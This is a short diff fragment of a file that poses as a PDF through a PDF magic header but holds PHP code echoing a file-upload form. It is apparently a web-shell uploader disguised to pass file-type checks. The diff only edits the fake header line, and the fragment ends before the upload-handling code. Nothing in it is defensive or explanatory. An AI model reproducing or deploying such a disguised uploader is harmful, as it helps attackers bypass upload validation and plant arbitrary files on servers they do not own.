@@ -1,4 +1,4 @@
-%PDF-1.4 %âãÏÓ 1 0 obj %PDF
+%PDF-1.4 %âãÏÓ
 <?php
 echo "<form action='' enctype='multipart/form-data' method='POST'>
 <input type='file' name='filena'>
